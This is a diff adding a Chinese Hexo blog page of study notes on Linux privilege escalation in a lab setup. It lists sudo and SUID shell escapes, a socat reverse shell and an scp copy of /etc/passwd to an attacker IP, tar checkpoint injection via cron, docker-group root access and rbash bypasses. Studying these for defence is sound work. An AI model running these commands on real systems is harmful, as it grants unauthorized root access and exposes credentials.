@@ -1,0 +1,857 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/wallhaven-j5kjgy_1920x1080.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="参考 都是先用 root 来模拟配置不当. 利用 SUID 二进制文件进行提权SUID 为 Set UID, 就是设置用户权限. 当你具有 SUID 权限二进制文件的可执行权限时，执行时会获得属主的权限. SUID 只能添加给二进制文件，且只有在运行时才会获得属主权限. 比如, 你给 rm 命令添加了 SUID 权限，假设 test 文件是 root 用户创建的文件，此时, 你是普通用户，具有 r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux-提权">
+<meta property="og:url" content="http://example.com/2022/12/08/Linux-%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="参考 都是先用 root 来模拟配置不当. 利用 SUID 二进制文件进行提权SUID 为 Set UID, 就是设置用户权限. 当你具有 SUID 权限二进制文件的可执行权限时，执行时会获得属主的权限. SUID 只能添加给二进制文件，且只有在运行时才会获得属主权限. 比如, 你给 rm 命令添加了 SUID 权限，假设 test 文件是 root 用户创建的文件，此时, 你是普通用户，具有 r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/sudoers_file_configurate_user.png">
+<meta property="og:image" content="http://example.com/img/using_git_to_enhance_the_power.png">
+<meta property="og:image" content="http://example.com/img/format_of_definition_of_cron.png">
+<meta property="article:published_time" content="2022-12-08T07:07:40.000Z">
+<meta property="article:modified_time" content="2022-12-08T12:58:28.791Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/sudoers_file_configurate_user.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Linux-提权 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Jie</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/SteinsGate_all.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Linux-提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-12-08 15:07" pubdate>
+          2022年12月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux-提权</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1QS4y1277a/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考</a></p>
+<p>都是先用 root 来模拟配置不当.</p>
+<h1 id="利用-SUID-二进制文件进行提权"><a href="#利用-SUID-二进制文件进行提权" class="headerlink" title="利用 SUID 二进制文件进行提权"></a>利用 SUID 二进制文件进行提权</h1><p>SUID 为 Set UID, 就是设置用户权限.</p>
+<p>当你具有 SUID 权限二进制文件的可执行权限时，执行时会获得属主的权限.</p>
+<p>SUID 只能添加给二进制文件，且只有在运行时才会获得属主权限.</p>
+<p>比如, 你给 <code>rm</code> 命令添加了 SUID 权限，假设 <code>test</code> 文件是 root 用户创建的文件，此时, 你是普通用户，具有 <code>rm</code> 的执行权限， 那么:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">rm</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+<p>将直接删除这个文件.</p>
+<p>常见利用方式:</p>
+<ul>
+<li><code>cp</code> 出 <code>/etc/passwd</code>, 利用 <code>openssl</code> 生成符合 passwd 格式的密码</li>
+<li><code>find</code> 的 <code>exec</code> 参数, 指定一个命令对搜索的结果进行处理</li>
+<li><code>vim</code></li>
+<li>脚本, 给普通脚本添加 suid</li>
+</ul>
+<p>如:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ find <span class="hljs-built_in">test</span> -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;whoami&quot;</span> \;<br></code></pre></td></tr></table></figure>
+
+<p>查看具有 SUID 权限的文件:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ find <span class="hljs-built_in">test</span> -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>当 vim 被赋予 suid 权限后，意味着任何用户都可以使用 vim 来编辑那些只能由 root 编辑的文件.</p>
+<p>如，修改 <code>/etc/sudoers</code> 文件，给你当前用户添加执行 <code>sudo</code> 的权限，也就是获得了 root 权限.</p>
+<p>可以用 <code>sudo -l</code> 查看当前用户的 <code>sudo</code> 权限.</p>
+<h1 id="利用-sudo-进行提权"><a href="#利用-sudo-进行提权" class="headerlink" title="利用 sudo 进行提权"></a>利用 sudo 进行提权</h1><p><code>sudo</code> 和 <code>su</code> 的区别:</p>
+<ul>
+<li><code>sudo</code> 全称是 super user do, 是用 root 权限执行命令</li>
+<li><code>su</code> 全称是 substitute user, 是切换账号</li>
+</ul>
+<p><code>/etc/sudoers</code> 文件中，对用户进行配置的格式, 如:</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ALL=(ALL:ALL) ALL<br></code></pre></td></tr></table></figure>
+<p><img src="/../img/sudoers_file_configurate_user.png" srcset="/img/loading.gif" lazyload></p>
+<p>不可用 <code>sudo</code> 执行的命令可以写成如:</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ALL=(ALL:ALL) ALL !/usr/bin/find<br></code></pre></td></tr></table></figure>
+
+<p>各命令用逗号 <code>,</code> 分隔:</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ALL=(ALL:ALL) /usr/bin/find,/usr/bin/vim<br></code></pre></td></tr></table></figure>
+
+<h2 id="当-sudo-允许执行-git-命令时，可利用-git-进行提权"><a href="#当-sudo-允许执行-git-命令时，可利用-git-进行提权" class="headerlink" title="当 sudo 允许执行 git 命令时，可利用 git 进行提权"></a>当 sudo 允许执行 git 命令时，可利用 git 进行提权</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo git <span class="hljs-built_in">help</span> config<br></code></pre></td></tr></table></figure>
+<p>或:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo git -p <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure>
+<p>上述命令可以进入 <code>git</code> 的帮助页面，然后在此页面下执行终端命令:</p>
+<p><img src="/../img/using_git_to_enhance_the_power.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><h3 id="用-find-命令"><a href="#用-find-命令" class="headerlink" title="用 find 命令"></a>用 find 命令</h3><p>如利用 <code>find</code> 命令的 <code>exec</code> 参数来切换到 root 权限.</p>
+<p><code>find</code> 使用 <code>exec</code> 参数时，需要以分号结尾，但由于分号在命令行中是特殊字符，要用 <code>\</code> 进行转义, 如:</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -exec &quot;/</span>bin/bash<span class="hljs-string">&quot; \;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="用-perl"><a href="#用-perl" class="headerlink" title="用 perl"></a>用 perl</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo perl -e <span class="hljs-string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="用-python"><a href="#用-python" class="headerlink" title="用 python"></a>用 python</h3><p>调用 pty 库，这是一个伪终端库，它的 spawn 会调用指定的程序:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="用-less-命令"><a href="#用-less-命令" class="headerlink" title="用 less 命令"></a>用 <code>less</code> 命令</h3><p>输入 <code>sudo less filename</code> 浏览文件内容时，到底部输入 <code>!bash</code> 后回车，会获得一个 <code>root</code> 权限的 shell.</p>
+<h3 id="用-awk-命令"><a href="#用-awk-命令" class="headerlink" title="用 awk 命令"></a>用 <code>awk</code> 命令</h3><p>通过调用 linux 的 system 函数来打开 bash:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="用-man-命令"><a href="#用-man-命令" class="headerlink" title="用 man 命令"></a>用 <code>man</code> 命令</h3><p>通过 <code>sudo man man</code> 命令来打开 <code>man</code> 的手册，输入 <code>!bash</code>, 获得一个具有 <code>root</code> 权限的 shell.</p>
+<h3 id="用-vi-命令"><a href="#用-vi-命令" class="headerlink" title="用 vi 命令"></a>用 <code>vi</code> 命令</h3><p>在 normal 模式下输入 <code>!bash</code></p>
+<h3 id="一些脚本文件"><a href="#一些脚本文件" class="headerlink" title="一些脚本文件"></a>一些脚本文件</h3><p>文件内容如:<br>shell 脚本:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#! /bin/bash</span><br>/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>perl 脚本:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><span class="hljs-keyword">exec</span> <span class="hljs-string">&quot;/bin/bash&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<h3 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h3><p>如 env, ftp, socat, scp.</p>
+<h4 id="通过-env-环境变量来获取-root-权限"><a href="#通过-env-环境变量来获取-root-权限" class="headerlink" title="通过 env 环境变量来获取 root 权限"></a>通过 env 环境变量来获取 root 权限</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo <span class="hljs-built_in">env</span> /bin/bash<br></code></pre></td></tr></table></figure>
+<h4 id="通过-ftp-来进入-bash-获取-root-权限"><a href="#通过-ftp-来进入-bash-获取-root-权限" class="headerlink" title="通过 ftp 来进入 bash 获取 root 权限"></a>通过 ftp 来进入 bash 获取 root 权限</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo ftp<br>ftp&gt; !/bin/bash<br></code></pre></td></tr></table></figure>
+<h4 id="通过-socat-客户端连接攻击机，攻击机可获得-rootshell"><a href="#通过-socat-客户端连接攻击机，攻击机可获得-rootshell" class="headerlink" title="通过 socat 客户端连接攻击机，攻击机可获得 rootshell"></a>通过 socat 客户端连接攻击机，攻击机可获得 rootshell</h4><p>socat 是 Socket Cat 和 Netcat 类似.</p>
+<p>先执行服务端，后执行客户端</p>
+<p>客户端执行:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444<br></code></pre></td></tr></table></figure>
+<p>攻击机执行:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ socat file:`<span class="hljs-built_in">tty</span>`,raw,<span class="hljs-built_in">echo</span>=0 tcp-listen:4444<br></code></pre></td></tr></table></figure>
+<h4 id="scp-用来复制一些系统的敏感文件"><a href="#scp-用来复制一些系统的敏感文件" class="headerlink" title="scp, 用来复制一些系统的敏感文件"></a>scp, 用来复制一些系统的敏感文件</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo scp /etc/passwd root@192.168.23.128:/root/Desktop<br></code></pre></td></tr></table></figure>
+<p>利用爆破软件破解，如 <code>john</code> 命令.</p>
+<h2 id="黑名单情况"><a href="#黑名单情况" class="headerlink" title="黑名单情况"></a>黑名单情况</h2><p>绕过 sudoers 的黑名单，将命令复制到其他路径下.</p>
+<h1 id="NFS-配置不当导致"><a href="#NFS-配置不当导致" class="headerlink" title="NFS 配置不当导致"></a>NFS 配置不当导致</h1><p>NFS 是 Network File System (网络文件系统) 的缩写. 用来挂载某个目录或文件进行共享，默认是 2049 端口.</p>
+<p>首先需要安装 nfs 的服务端.</p>
+<h1 id="使用-PATH-变量进行-Linux-提权"><a href="#使用-PATH-变量进行-Linux-提权" class="headerlink" title="使用 PATH 变量进行 Linux 提权"></a>使用 PATH 变量进行 Linux 提权</h1><p>root 给一个可执行文件赋予了 suid, 而此文件又调用了另一个脚本，这个脚本的执行时也会获得 root 权限.</p>
+<p>也是配合 suid.</p>
+<h1 id="利用-Cron-进行-Linux-提权"><a href="#利用-Cron-进行-Linux-提权" class="headerlink" title="利用 Cron 进行 Linux 提权"></a>利用 Cron 进行 Linux 提权</h1><p>cronjobs 是定时任务，在特定的日期和时间执行计划任务.</p>
+<p>在其配置文件 <code>/etc/crontab</code> 下配置.</p>
+<p>定义格式如下:<br><img src="/../img/format_of_definition_of_cron.png" srcset="/img/loading.gif" lazyload></p>
+<p>如，添加一个任务为:</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">*<span class="hljs-regexp">/2 *  * * *  root  /</span>tmp/hack.pl<br></code></pre></td></tr></table></figure>
+<p>这个定时脚本具有 root 权限。(脚本需要有可执行权限:)</p>
+<p>可以让脚本文件修改 <code>sudoers</code> 文件，把当前用户添加进去，获得 <code>sudo</code> 所有权，从而进行提权.</p>
+<p>配合 <code>tar</code> 命令的 <code>--checkpoint[=N]</code> 参数和 <code>--checkpoint-action=ACTION</code> 参数. 为，每压缩多少个文件，执行一次 <code>--checkpoint-action</code> 后的命令.</p>
+<p>让 <code>tar</code> 将文件名当作参数执行, 两个文件名为分别为: <code>--checkpoint=1</code> 和 <code>--checkpoint-action=sh hack.pl</code>, 那么， <code>tar</code> 打包这两个文件的命令就成了:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar --checkpoint=1<br></code></pre></td></tr></table></figure>
+<p>和</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar --checkpoint-action=sh hack.pl<br></code></pre></td></tr></table></figure>
+
+<h1 id="利用-Docker-进行-Linux-提权"><a href="#利用-Docker-进行-Linux-提权" class="headerlink" title="利用 Docker 进行 Linux 提权"></a>利用 Docker 进行 Linux 提权</h1><p>条件是，普通用户被添加到了 docker 用户组中.</p>
+<p>利用方式如:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -v /:/mnt -it alpine<br></code></pre></td></tr></table></figure>
+
+<p>相当于有了 root 权限.</p>
+<p>还有将 <code>/etc/passwd</code>, <code>/etc/sudoers</code> 等文件挂载进 docker 容器, 然后修改.</p>
+<h1 id="rbash-绕过总结"><a href="#rbash-绕过总结" class="headerlink" title="rbash 绕过总结"></a>rbash 绕过总结</h1><p>rbash 是 Restricted bash 的缩写。</p>
+<p>管理员可通过指定普通用户的 bash 为 rbash, 来限制相关操作. 在 rbash 中，很多行为和命令都会被受到限制 。</p>
+<p>这里实际为绕过 rbash 的限制，绕过之后依旧是当前的普通用户，因此不算提权.</p>
+<p>将用户默认终端设置为 rbash:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ usermod -s /bin/rbash username<br></code></pre></td></tr></table></figure>
+
+<h2 id="通过-vi-绕过"><a href="#通过-vi-绕过" class="headerlink" title="通过 vi 绕过"></a>通过 vi 绕过</h2><p>在 vi 的 normal 模式下输入 <code>:!/bin/bash</code>, 返回一个终端.</p>
+<h2 id="用-ed-绕过"><a href="#用-ed-绕过" class="headerlink" title="用 ed 绕过"></a>用 ed 绕过</h2><p>ed 也是一个编辑器，和 vi 类似，也可输入命令.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ed<br>!<span class="hljs-string">&#x27;/bin/bash&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="可以在-rbash-中执行-sh-bash-dash-等"><a href="#可以在-rbash-中执行-sh-bash-dash-等" class="headerlink" title="可以在 rbash 中执行 sh, bash, dash 等"></a>可以在 rbash 中执行 sh, bash, dash 等</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sh<br>$ <span class="hljs-comment"># or</span><br>$ bash<br>$ <span class="hljs-comment"># or</span><br>$ dash<br></code></pre></td></tr></table></figure>
+
+<h2 id="使用-python-perl-绕过"><a href="#使用-python-perl-绕过" class="headerlink" title="使用 python, perl 绕过"></a>使用 python, perl 绕过</h2><p>如果可以运行 python 或 perl 的话:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -e <span class="hljs-string">&#x27;system(&quot;/bin/sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="使用-awk-绕过"><a href="#使用-awk-绕过" class="headerlink" title="使用 awk 绕过"></a>使用 awk 绕过</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="使用-more-less-man-等绕过"><a href="#使用-more-less-man-等绕过" class="headerlink" title="使用 more, less, man 等绕过"></a>使用 more, less, man 等绕过</h2><p>随便读取一个文件.</p>
+<p>如:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ more .bashrc<br>!<span class="hljs-string">&#x27;sh&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="ssh-登录绕过"><a href="#ssh-登录绕过" class="headerlink" title="ssh 登录绕过"></a>ssh 登录绕过</h2><p>用 ssh 登录时给自己分配 bash:</p>
+<p>如: </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ssh username@192.168.23.134 -t <span class="hljs-string">&quot;bash --noprofile&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="利用工具查找漏洞提权"><a href="#利用工具查找漏洞提权" class="headerlink" title="利用工具查找漏洞提权"></a>利用工具查找漏洞提权</h1><p>安全脚本如:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://github.com/rebootuser/LinEnum"><code>http://github.com/rebootuser/LinEnum</code></a></li>
+<li><a target="_blank" rel="noopener" href="http://github.com/jondonas/linux-exploit-suggester-2"><code>http://github.com/jondonas/linux-exploit-suggester-2</code></a></li>
+<li><a target="_blank" rel="noopener" href="http://github.com/redcode-labs/Bashark"><code>http://github.com/redcode-labs/Bashark</code></a></li>
+<li><a target="_blank" rel="noopener" href="http://github.com/AlessandroZ/BeRoot"><code>http://github.com/AlessandroZ/BeRoot</code></a></li>
+<li><a target="_blank" rel="noopener" href="http://github.com/SecWiki/linux-kernel-exploits"><code>http://github.com/SecWiki/linux-kernel-exploits</code></a></li>
+<li><a target="_blank" rel="noopener" href="http://github.com/diego-treitos/linux-smart-enumeration"><code>http://github.com/diego-treitos/linux-smart-enumeration</code></a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux/" class="category-chain-item">Linux</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Linux-提权</div>
+      <div>http://example.com/2022/12/08/Linux-提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年12月8日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/12/09/Perl-%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B-Notes/" title="Perl-语言编程-Notes">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Perl-语言编程-Notes</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/07/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" title="概率论与数理统计课程笔记">
+                        <span class="hidden-mobile">概率论与数理统计课程笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
